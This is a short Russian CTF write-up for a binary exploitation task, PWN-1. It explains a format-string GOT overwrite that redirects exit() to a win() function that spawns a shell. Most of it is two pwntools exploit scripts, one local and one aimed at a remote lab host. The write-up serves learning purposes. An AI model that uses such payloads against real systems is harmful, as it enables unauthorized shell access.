#  Решение PWN-1 (10)
1. Открыв файл гидрой видим функцию main, которая считывает ввод пользователя и выводит его в консоль.
2. Обнаруживаем функцию win() с командой ```/bin/sh```. Сюда и надо копать.
3. Понимаем, что нужно перезаписать exit-функцию на функцию win().
4. Сделать это возможно с помощью перезаписи GOT через Format-strings.
5. Нагугливаем очень хорошую статью с похожим кейсом - [вот сама статья](https://habr.com/ru/articles/460647/)
```
from pwn import *
from struct import *

start_addr = 0x401162
exit_addr = 0x404038

ex = process('./vuln')

payload = ("%98p%14$n%16303p%15$n").ljust(64, '*')
payload += pack("Q", exit_addr)
payload += pack("Q", exit_addr+1)

ex.sendline(payload)

ex.interactive()
```
6. Изучив код статьи понимаем, что вместо start_addr нам нужно найти адрес функции win().
7. Через gdb находим адреса в стеке.
```
exit_addr = 4210712
win_addr = 0x401156
```
8. Пишем итоговый эксплоит:
```
from pwn import *
from struct import *

exit_addr = 4210712
win_addr = 0x401156

ex = remote('192.168.12.13', 1923)

payload = (b"%86p%14$n%16315p%15$n").ljust(64, b"*")
payload += p64(exit_addr)
payload += p64(exit_addr+1)


ex.sendline(payload)

ex.interactive()
```
9. Профит
![flag](https://github.com/artkegor/nto2024_writeups/blob/main/task-based/pwn1/proofpwn1.png)
